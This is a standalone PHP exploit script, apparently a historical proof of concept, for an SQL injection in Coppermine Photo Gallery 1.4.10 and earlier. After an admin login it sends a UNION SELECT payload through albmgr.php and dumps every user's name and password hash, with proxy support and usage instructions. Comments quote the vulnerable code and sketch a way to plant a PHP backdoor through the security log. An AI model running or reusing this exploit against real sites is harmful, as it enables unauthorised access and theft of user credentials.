#!/usr/bin/php
<?php

/**
 * This file require the PhpSploit class.
 * If you want to use this class, the latest
 * version can be downloaded from acid-root.new.fr.
 **/
require("phpsploitclass.php");


if($argc < 4)
{
        print 
"\n---------------------------------------------------------";
        print "\nAffected.scr..: Coppermine Photo Gallery <= 1.4.10";
        print "\nPoc.ID........: 19070104";
        print "\nType..........: SQL Injection";
        print "\nRisk.level....: Medium";
        print "\nSrc.download..: coppermine-gallery.net";
        print "\nPoc.link......: acid-root.new.fr/poc/19070104.txt";
        print "\nCredits.......: DarkFig";
        print 
"\n---------------------------------------------------------";
        print "\nUsage.........: php xpl.php <url> <adminuser> 
<adminpass>";
        print "\nProxyOptions..: <proxhost:proxport> 
<proxuser:proxpass>";
        print "\nExample.......: php xpl.php http://c.com/ admin 
passwd";
        print 
"\n---------------------------------------------------------\n";
        exit(1);
}


/*/
  [0] => xpl.php         [1] => http://localhost/cpg1410/
  [2] => root            [3] => toor
  [4] => localhost:8200  [5] => user:passwd
/*/
$url=$argv[1];$adu=$argv[2];
$adp=$argv[3];$pxs=$argv[4];
$pxa=$argv[5];

$xpl = new phpsploit();
$xpl->agent("InternetExploiter");
$xpl->cookiejar(1);
$xpl->allowredirection(1);

print "\nheader> ===============================================";
print "\nheader> Coppermine Photo Gallery 1.4.10 (SQL Injection)";
print "\nheader> ===============================================";

if(!empty($pxs)){
        print "\nstatus> Using a proxy $pxs";

        $xpl->proxy($pxs);
}

if(!empty($pxa)){
        print "\nstatus> Basic proxy authentification $pxa";
        $xpl->proxyauth($pxa);
}


/*/
  Table prefix.
/*/
print "\nstatus> Searching the version";
$xpl->get($url.'include/index.html');
if(preg_match("#Coppermine version: 
([0-9]*\.[0-9]*\.[0-9]*)#",$xpl->getcontent(),$matches)) print 
"\nsploit> Coppermine version ".$matches[1];
else print "\nsploit> Not found";
$table = !empty($matches[1]) ? 
'cpg'.str_replace('.','',$matches[1]).'_users' : 'cpg1410_users';


/*/
  If you have the admin cookie (but not the password),
  replace lines 73=>76 by $xpl->addcookie('yourcookie');
/*/
print "\nstatus> Trying to get logged in";
$xpl->post($url."login.php?referer=index.php","username=$adu&password=$adp&remember_me=1&submitted=Se+Connecter");
if(!preg_match("#color:red#",$xpl->getcontent())) print "\nsploit> 
Done";
else die("\nstatus> Exploit failed\n");


/*/
  (usermgr.php)
  =============
  case 'group_alb_access' :
  if (isset($_GET['gid']))  $group_id = $_GET['gid'];
  $sql = "SELECT group_name  FROM [...] WHERE group_id = $group_id 
[...]";
  $result = cpg_db_query($sql);

  (db_ecard.php)
  ==============
  $start = isset($_REQUEST['start']) ? $_REQUEST['start'] : '';  [...]
  if (!$start) {$startFrom = '0';}else{$startFrom=$start;}  [...]
  $result = cpg_db_query("SELECT [...] ORDER BY $sortBy $sortDirection 
LIMIT $startFrom,$countTo");

  (albmgr.php)
  ============
  $cat = isset($_GET['cat']) ? ($_GET['cat']) : 0;
  if ($cat == 1) $cat = 0;
  if (GALLERY_ADMIN_MODE) {
  $result = cpg_db_query("SELECT [...] WHERE category = $cat ORDER BY 
pos ASC");
 (filename_to_title())
  =====================
  $albumid = (isset($_POST['albumid'])) ? $_POST['albumid'] : 0;
  $albstr = ($albumid) ? " WHERE aid = $albumid" : ''; [...]
  $result = cpg_db_query("SELECT * FROM {$CONFIG['TABLE_PICTURES']} 
$albstr");

  (del_titles())
  ==============
  $albumid = (isset($_POST['albumid'])) ? $_POST['albumid'] : 0;
  $albstr = ($albumid) ? " WHERE aid = $albumid" : '';
  $result = cpg_db_query("SELECT * FROM {$CONFIG['TABLE_PICTURES']} 
$albstr");
/*/
print "\nstatus> Retrieving all members password";
$xpl->get($url."albmgr.php?cat=-1/**/union/**/select/**/user_name,user_password/**/from/**/$table/*");
if(preg_match_all("#<option 
value=\"album_no=(.*),album_nm='([a-z0-9]{32})'#",$xpl->getcontent(),$matches)) 
print "\nsploit> Done";
else die("\nstatus> Exploit failed\n");

print "\nsploit> +----------------------------------+----------+";
print "\nsploit> |             PASSWORD             |   USER   |";
print "\nsploit> +----------------------------------+----------+";


/*/
  (init.inc.php)
  ==============
  $HTML_SUBST = array('&' => '&amp;', '"' => '&quot;', '<' => '&lt;', 
'>' => '&gt;', '%26' => '&amp;', '%22' => '&quot;', '%3C' => '&lt;', 
'%3E' =>
'&gt;','%27' => '&#39;', "'" => '&#39;');
  [...]
  if (is_array($_POST)) { // and GET, SERVER, REQUEST...
  foreach ($_POST as $key => $value) {
  if (!is_array($value))
  $_POST[$key] = strtr(stripslashes($value), $HTML_SUBST);
  if (!in_array($key, $keysToSkip) && isset($$key)) unset($$key);
  }

  ... that's why we use the html_entity_decode() function.
  I just wanted < for a remote php code execution sploit without admin 
rights :'(.
  When the admin view the security logs, it include 
"security.log.php"...

  (security.log.php)
  ==================
  [...]
  if (!defined('IN_COPPERMINE')) die(); ?>

  Denied privileged access to viewlog.php from user Guest at  on January 
4, 2007, 2:10 pm
  Failed login attempt with Username: &lt;?php mail(you); [...] 
fwrite(backdoor.php); [...] /* from IP 127.0.0.1 on Jan 04, 2007 at 
01:16 PM
/*/
for($i=0;$i<count($matches[0]);$i++)
{
        print "\nsploit> | ".$matches[2][$i].' | 
'.html_entity_decode($matches[1][$i]);
        if($i==(count($matches[0])-1)){
        print "\nsploit> 
+----------------------------------+----------+\n";
        }
}


?>

